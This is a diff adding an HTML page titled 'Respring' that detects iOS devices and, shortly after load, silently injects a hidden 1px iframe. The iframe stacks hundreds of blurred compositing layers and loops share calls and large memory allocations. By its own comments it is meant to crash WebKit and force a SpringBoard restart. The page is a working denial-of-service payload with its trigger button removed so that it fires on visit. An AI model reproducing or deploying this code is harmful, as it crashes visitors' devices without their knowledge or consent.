@@ -1,0 +1,70 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+  <meta name="theme-color" content="#000000">
+  <title>Respring</title>
+  <style>
+    /* Same look as an iOS respring: black screen */
+    :root{color-scheme:dark}
+    html,body{margin:0;height:100%;background:#000}
+  </style>
+</head>
+<body>
+  <script>
+    'use strict';
+    // WebRespring payload (Holy VibeCode, Festare): hidden iframe full of
+    // extreme backdrop-filter compositing layers plus memory/share pressure.
+    // On a stock device this wedges WebKit badly enough that SpringBoard is
+    // taken down and launchd brings it back - a real respring, no jailbreak.
+    // The trigger script is kept byte-compatible with the original page;
+    // only the button/flag UI around it is stripped so it fires on load.
+    function detectDevice(ua, platform, touches) {
+      const ipad = /iPad/.test(ua) || (/Mac/.test(platform) && touches > 1);
+      const ios = ipad || /iPhone|iPod/.test(ua);
+      return ios;
+    }
+    const isIOS = detectDevice(navigator.userAgent, navigator.platform, navigator.maxTouchPoints || 0);
+
+    const CRASH_SCRIPT = `<!doctype html>
+<html>
+<body style="margin:0;overflow:hidden">
+<script>
+const container = document.createElement('div');
+container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
+document.body.appendChild(container);
+for (let i = 0; i < 500; i++) {
+  const layer = document.createElement('div');
+  layer.style.cssText = 'position:absolute;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,' + i + 'px) rotateY(90deg);opacity:0.99;';
+  container.appendChild(layer);
+}
+setInterval(() => {
+  try { navigator.share({title:'R', text:'R'.repeat(100000)}); } catch (e) {}
+  const block = new Uint8Array(1024 * 1024 * 20);
+  crypto.getRandomValues(block);
+}, 0);
+<\/script>
+</body>
+</html>`;
+
+    function triggerRespringCrash() {
+      if (!isIOS || document.getElementById('respring-crash')) return;
+      const frame = document.createElement('iframe');
+      frame.id = 'respring-crash';
+      frame.className = 'crash-frame';
+      frame.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;border:0;opacity:.05;pointer-events:none';
+      frame.setAttribute('aria-hidden', 'true');
+      frame.setAttribute('tabindex', '-1');
+      frame.setAttribute('sandbox', 'allow-forms allow-modals allow-scripts allow-same-origin');
+      frame.srcdoc = CRASH_SCRIPT;
+      document.body.append(frame);
+    }
+
+    // Fire shortly after load, matching the original page's 700 ms delay
+    if (isIOS) {
+      setTimeout(triggerRespringCrash, 600);
+    }
+  </script>
+</body>
+</html>
